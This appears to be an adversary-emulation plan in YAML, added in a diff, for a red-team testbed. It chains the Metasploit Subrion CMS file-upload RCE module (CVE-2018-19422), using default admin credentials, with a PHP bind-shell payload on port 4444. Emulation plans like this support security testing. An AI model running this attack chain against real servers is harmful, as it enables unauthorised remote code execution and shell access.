@@ -1,0 +1,91 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-10 23:06:43 UTC+0000
+attack_action_sequence:
+  - uuid: be8e1965-514d-4713-be63-2accf8a6e717
+    name: Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE
+    id:
+      - T1190
+    source: Metasploit Exploit
+    supported_platforms:
+      - PHP
+    tactics:
+      - Execution
+      - Initial Access
+    technique:
+      - T1203
+      - T1190
+    description: This module exploits an authenticated file upload vulnerability in
+      Subrion CMS versions 4.2.1 and lower. The vulnerability is caused by the .htaccess
+      file not preventing the execution of .pht, .phar, and .xhtml files. Files with
+      these extensions are not included in the .htaccess blacklist, hence these files
+      can be uploaded and executed to achieve remote code execution. In this module,
+      a .phar file with a randomized name is uploaded and executed to receive a Meterpreter
+      session on the target, then deletes itself afterwards.
+    testbed:
+      CVE:
+        - CVE-2018-19422
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("multi/http/subrion_cms_file_upload_rce")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 80
+        Required: true
+        Description: Subrion CMS default port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      DOMAIN:
+        CurrentSetting: WORKSTATION
+        Required: true
+        Description: The domain to use for Windows authentication
+      TARGETURI:
+        CurrentSetting: /
+        Required: true
+        Description: Base path
+      USERNAME:
+        CurrentSetting: admin
+        Required: true
+        Description: Username to authenticate with
+      PASSWORD:
+        CurrentSetting: admin
+        Required: true
+        Description: Password to authenticate with
+  - uuid: 971821cb-4bec-4b19-9b7e-65e5a348cd69
+    name: PHP Command Shell, Bind TCP (via PHP)
+    id:
+      - T1059.007
+      - T1071
+    source: Metasploit Payload
+    supported_platforms:
+      - PHP
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - T1059.007
+      - T1071
+    description: Listen for a connection and spawn a command shell via php
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("php/bind_php")
+    arguments:
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+      RHOST:
+        CurrentSetting: ''
+        Required: false
+        Description: The target address
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2018-19422
